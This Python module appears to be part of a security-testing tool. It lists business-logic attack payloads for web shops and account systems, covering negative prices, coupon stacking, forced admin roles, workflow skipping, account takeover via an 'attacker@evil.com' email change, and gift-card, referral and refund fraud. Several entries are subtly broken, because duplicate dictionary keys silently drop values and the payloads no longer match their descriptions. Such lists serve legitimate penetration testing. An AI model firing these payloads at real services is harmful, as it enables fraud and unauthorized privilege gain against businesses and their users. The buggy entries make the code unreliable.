"""
Business Logic Flaws Payloads

Payloads for business logic vulnerability testing including:
- Price manipulation
- Coupon abuse
- Parameter tampering
- Workflow bypass
- Privilege escalation
"""

# Price manipulation payloads
PRICE_MANIPULATION = [
    {
        "name": "negative_price",
        "payload": {"price": -100},
        "description": "Negative price attack",
        "business_logic": "price_validation",
    },
    {
        "name": "zero_price",
        "payload": {"price": 0},
        "description": "Zero price attack",
        "business_logic": "price_validation",
    },
    {
        "name": "float_overflow",
        "payload": {"price": 1.7976931348623157e308},
        "description": "Float overflow in price",
        "business_logic": "price_validation",
    },
    {
        "name": "price_fraction",
        "payload": {"price": 0.01},
        "description": "Fractional price bypass",
        "business_logic": "price_validation",
    },
    {
        "name": "large_integer",
        "payload": {"price": 999999999999},
        "description": "Large integer price",
        "business_logic": "price_validation",
    },
    {
        "name": "scientific_notation",
        "payload": {"price": "1e10"},
        "description": "Scientific notation price",
        "business_logic": "price_validation",
    },
]

# Quantity manipulation payloads
QUANTITY_MANIPULATION = [
    {
        "name": "negative_quantity",
        "payload": {"quantity": -1},
        "description": "Negative quantity",
        "business_logic": "quantity_validation",
    },
    {
        "name": "zero_quantity",
        "payload": {"quantity": 0},
        "description": "Zero quantity for free item",
        "business_logic": "quantity_validation",
    },
    {
        "name": "max_quantity",
        "payload": {"quantity": 999999},
        "description": "Maximum quantity bypass",
        "business_logic": "quantity_limit_bypass",
    },
    {
        "name": "float_quantity",
        "payload": {"quantity": 1.5},
        "description": "Float quantity",
        "business_logic": "quantity_validation",
    },
]

# Coupon abuse payloads
COUPON_ABUSE = [
    {
        "name": "coupon_stacking",
        "payload": {"coupons": ["SAVE10", "SAVE20", "SAVE30"]},
        "description": "Multiple coupon application",
        "business_logic": "coupon_limitation",
    },
    {
        "name": "reuse_coupon",
        "payload": {"coupon": "WELCOME10"},
        "description": "Coupon reuse after first use",
        "business_logic": "coupon_single_use",
    },
    {
        "name": "expired_coupon",
        "payload": {"coupon": "EXPIRED2020"},
        "description": "Expired coupon acceptance",
        "business_logic": "coupon_expiry_validation",
    },
    {
        "name": "other_user_coupon",
        "payload": {"coupon": "USER20", "other_user_id": "victim_user"},
        "description": "Apply another user's coupon",
        "business_logic": "coupon_ownership",
    },
]

# Payment manipulation payloads
PAYMENT_MANIPULATION = [
    {
        "name": "zero_amount",
        "payload": {"amount": 0},
        "description": "Zero payment amount",
        "business_logic": "payment_validation",
    },
    {
        "name": "negative_amount",
        "payload": {"amount": -100},
        "description": "Negative payment (refund)",
        "business_logic": "payment_validation",
    },
    {
        "name": "partial_payment",
        "payload": {"amount": 0.01},
        "description": "Partial payment bypass",
        "business_logic": "minimum_payment",
    },
    {
        "name": "currency_mismatch",
        "payload": {"amount": 100, "currency": "USD"},
        "description": "Currency manipulation",
        "business_logic": "currency_validation",
    },
    {
        "name": "free_shipping_bypass",
        "payload": {"shipping": 0, "override_shipping": True},
        "description": "Free shipping bypass",
        "business_logic": "shipping_validation",
    },
]

# Privilege escalation payloads
PRIVILEGE_ESCALATION = [
    {
        "name": "role_parameter",
        "payload": {"role": "admin"},
        "description": "Direct role assignment",
        "business_logic": "authorization_check",
    },
    {
        "name": "is_admin_param",
        "payload": {"is_admin": True, "is_admin": 1},
        "description": "Is-admin parameter",
        "business_logic": "authorization_check",
    },
    {
        "name": "user_type",
        "payload": {"user_type": "administrator", "user_type": "admin"},
        "description": "User type privilege bypass",
        "business_logic": "authorization_check",
    },
    {
        "name": "group_privilege",
        "payload": {"group": "administrators", "group": "root"},
        "description": "Group-based privilege escalation",
        "business_logic": "authorization_check",
    },
    {
        "name": "permission_bits",
        "payload": {"permissions": 0xFFFFFFFF},
        "description": "Permission bit manipulation",
        "business_logic": "authorization_check",
    },
]

# Workflow bypass payloads
WORKFLOW_BYPASS = [
    {
        "name": "skip_step",
        "payload": {"step": "4", "current_step": 1},
        "description": "Skip workflow steps",
        "business_logic": "workflow_enforcement",
    },
    {
        "name": "parameter_tampering",
        "payload": {"approved": True, "skip_verification": True},
        "description": "Skip approval verification",
        "business_logic": "workflow_enforcement",
    },
    {
        "name": "back_button_manipulation",
        "payload": {"action": "back", "back_to": "dashboard"},
        "description": "Back button manipulation",
        "business_logic": "workflow_enforcement",
    },
    {
        "name": "direct_access",
        "payload": {"direct_access": True, "redirect": "payment_complete"},
        "description": "Direct access to protected state",
        "business_logic": "workflow_enforcement",
    },
]

# Account management flaws
ACCOUNT_MANIPULATION = [
    {
        "name": "unlimited_funds",
        "payload": {"balance": 999999999},
        "description": "Unlimited funds attempt",
        "business_logic": "balance_validation",
    },
    {
        "name": "account_takeover",
        "payload": {"email": "victim@target.com", "new_email": "attacker@evil.com"},
        "description": "Account takeover via email change",
        "business_logic": "ownership_verification",
    },
    {
        "name": "disable_2fa",
        "payload": {"disable_2fa": True, "reason": "lost_phone"},
        "description": "2FA bypass via disable",
        "business_logic": "2fa_enforcement",
    },
    {
        "name": "skip_verification",
        "payload": {"skip_email_verification": True},
        "description": "Skip email verification",
        "business_logic": "verification_enforcement",
    },
]

# API business logic flaws
API_BUSINESS_LOGIC = [
    {
        "name": "id_oracle",
        "payload": {"user_id": 1, "user_id": 2, "user_id": 3},
        "description": "ID parameter oracle",
        "business_logic": "parameter_oracle",
    },
    {
        "name": "status_override",
        "payload": {"status": "completed", "override_status": True},
        "description": "Status override parameter",
        "business_logic": "status_enforcement",
    },
    {
        "name": "batch_processing_abuse",
        "payload": [{"process": True}, {"process": True}, {"process": True}],
        "description": "Batch processing abuse",
        "business_logic": "rate_limiting",
    },
]

# Success indicators for business logic flaws
BUSINESS_LOGIC_SUCCESS = [
    "completed",
    "success",
    "approved",
    "granted",
    "admin",
    "administrator",
    "free",
    "skipped",
    "bypassed",
]

# Common business logic parameters
BUSINESS_LOGIC_PARAMS = [
    "price",
    "amount",
    "quantity",
    "discount",
    "coupon",
    "role",
    "is_admin",
    "user_type",
    "group",
    "permissions",
    "step",
    "approved",
    "verified",
    "status",
    "balance",
    "shipping",
    "currency",
]

# Time-based manipulation payloads
TIME_MANIPULATION = [
    {
        "name": "expired_discount",
        "payload": {"discount_expires": "2099-12-31T23:59:59Z"},
        "description": "Future expiry date manipulation",
        "business_logic": "time_validation",
    },
    {
        "name": "past_flash_sale",
        "payload": {"sale_start": "2020-01-01T00:00:00Z", "sale_end": "2099-12-31T23:59:59Z"},
        "description": "Flash sale time window bypass",
        "business_logic": "sale_time_validation",
    },
    {
        "name": "timezone_exploit",
        "payload": {"timestamp": "2024-01-01T00:00:00-12:00"},
        "description": "Timezone manipulation for early access",
        "business_logic": "timezone_validation",
    },
    {
        "name": "trial_extension",
        "payload": {"trial_end": "2099-12-31", "trial_days": 99999},
        "description": "Trial period extension",
        "business_logic": "trial_validation",
    },
    {
        "name": "subscription_backdate",
        "payload": {"subscription_start": "2020-01-01", "billing_cycle_start": "2020-01-01"},
        "description": "Subscription start date manipulation",
        "business_logic": "subscription_validation",
    },
]

# Referral/affiliate abuse payloads
REFERRAL_ABUSE = [
    {
        "name": "self_referral",
        "payload": {"referrer_id": "SELF", "referred_by": "current_user"},
        "description": "Self-referral bonus attempt",
        "business_logic": "referral_validation",
    },
    {
        "name": "referral_loop",
        "payload": {"referrer": "user_a", "referred": "user_b", "chain": True},
        "description": "Circular referral chain",
        "business_logic": "referral_chain_validation",
    },
    {
        "name": "referral_code_reuse",
        "payload": {"referral_code": "USED_CODE", "force_apply": True},
        "description": "Reuse exhausted referral code",
        "business_logic": "referral_usage_limit",
    },
    {
        "name": "affiliate_commission_manipulation",
        "payload": {"commission_rate": 100, "affiliate_id": "attacker"},
        "description": "Affiliate commission manipulation",
        "business_logic": "affiliate_validation",
    },
    {
        "name": "referral_reward_stacking",
        "payload": {"referral_rewards": ["REWARD1", "REWARD2", "REWARD3"]},
        "description": "Stack multiple referral rewards",
        "business_logic": "reward_stacking",
    },
]

# Subscription tier manipulation
SUBSCRIPTION_MANIPULATION = [
    {
        "name": "tier_upgrade_free",
        "payload": {"tier": "enterprise", "plan": "premium", "price_override": 0},
        "description": "Free tier upgrade attempt",
        "business_logic": "subscription_tier",
    },
    {
        "name": "downgrade_refund",
        "payload": {"action": "downgrade", "refund_full": True, "keep_features": True},
        "description": "Downgrade with full refund keeping features",
        "business_logic": "downgrade_policy",
    },
    {
        "name": "plan_feature_injection",
        "payload": {"features": ["unlimited_api", "priority_support", "custom_domain"]},
        "description": "Inject premium features into basic plan",
        "business_logic": "feature_entitlement",
    },
    {
        "name": "seat_manipulation",
        "payload": {"seats": 999, "licensed_users": 999},
        "description": "License seat count manipulation",
        "business_logic": "seat_validation",
    },
    {
        "name": "grandfathered_plan",
        "payload": {"plan_id": "legacy_unlimited", "grandfathered": True},
        "description": "Claim grandfathered unlimited plan",
        "business_logic": "plan_validation",
    },
]

# Gift card and credit abuse
GIFT_CARD_ABUSE = [
    {
        "name": "negative_gift_card",
        "payload": {"gift_card_value": -100, "card_code": "NEGATIVE"},
        "description": "Negative gift card value",
        "business_logic": "gift_card_validation",
    },
    {
        "name": "gift_card_generation",
        "payload": {"generate_code": True, "value": 1000},
        "description": "Arbitrary gift card generation",
        "business_logic": "gift_card_creation",
    },
    {
        "name": "gift_card_duplication",
        "payload": {"card_code": "VALID_CODE", "duplicate": True},
        "description": "Gift card code duplication",
        "business_logic": "gift_card_uniqueness",
    },
    {
        "name": "store_credit_overflow",
        "payload": {"store_credit": 999999999, "add_credit": True},
        "description": "Store credit balance overflow",
        "business_logic": "credit_validation",
    },
    {
        "name": "points_manipulation",
        "payload": {"loyalty_points": 999999, "redeem_points": 1},
        "description": "Loyalty points manipulation",
        "business_logic": "points_validation",
    },
]

# Inventory and stock manipulation
INVENTORY_MANIPULATION = [
    {
        "name": "oversell_item",
        "payload": {"quantity": 999, "ignore_stock": True},
        "description": "Purchase more than available stock",
        "business_logic": "inventory_validation",
    },
    {
        "name": "reserve_all_stock",
        "payload": {"reserve": True, "quantity": "all"},
        "description": "Reserve entire inventory",
        "business_logic": "reservation_limit",
    },
    {
        "name": "backorder_abuse",
        "payload": {"allow_backorder": True, "quantity": 9999},
        "description": "Abuse backorder system",
        "business_logic": "backorder_validation",
    },
    {
        "name": "preorder_manipulation",
        "payload": {"preorder": True, "release_date": "2020-01-01"},
        "description": "Preorder with past release date",
        "business_logic": "preorder_validation",
    },
]

# Rate limit bypass for business actions
RATE_LIMIT_BYPASS = [
    {
        "name": "action_flooding",
        "payload": {"actions": [{"type": "purchase"}] * 100},
        "description": "Flood actions in single request",
        "business_logic": "rate_limiting",
    },
    {
        "name": "user_id_rotation",
        "payload": {"user_id": "rotated", "bypass_limit": True},
        "description": "Bypass rate limit via user ID rotation",
        "business_logic": "rate_limit_identity",
    },
    {
        "name": "api_key_abuse",
        "payload": {"api_key": "unlimited", "rate_limit_override": True},
        "description": "API key rate limit override",
        "business_logic": "api_rate_limiting",
    },
]

# Refund and chargeback abuse
REFUND_ABUSE = [
    {
        "name": "double_refund",
        "payload": {"order_id": "123", "refund": True, "keep_item": True},
        "description": "Double refund attempt",
        "business_logic": "refund_validation",
    },
    {
        "name": "partial_refund_abuse",
        "payload": {"refund_amount": 999, "item_value": 100},
        "description": "Refund more than item value",
        "business_logic": "refund_amount_validation",
    },
    {
        "name": "return_different_item",
        "payload": {"return_item_id": "cheap_item", "order_item_id": "expensive_item"},
        "description": "Return different item for refund",
        "business_logic": "return_validation",
    },
    {
        "name": "digital_refund_keep",
        "payload": {"digital_product": True, "refund": True, "revoke_access": False},
        "description": "Refund digital product keeping access",
        "business_logic": "digital_refund_policy",
    },
]

# Combined payload list for easy iteration
ALL_BUSINESS_LOGIC_PAYLOADS = (
    PRICE_MANIPULATION +
    QUANTITY_MANIPULATION +
    COUPON_ABUSE +
    PAYMENT_MANIPULATION +
    PRIVILEGE_ESCALATION +
    WORKFLOW_BYPASS +
    ACCOUNT_MANIPULATION +
    API_BUSINESS_LOGIC +
    TIME_MANIPULATION +
    REFERRAL_ABUSE +
    SUBSCRIPTION_MANIPULATION +
    GIFT_CARD_ABUSE +
    INVENTORY_MANIPULATION +
    RATE_LIMIT_BYPASS +
    REFUND_ABUSE
)
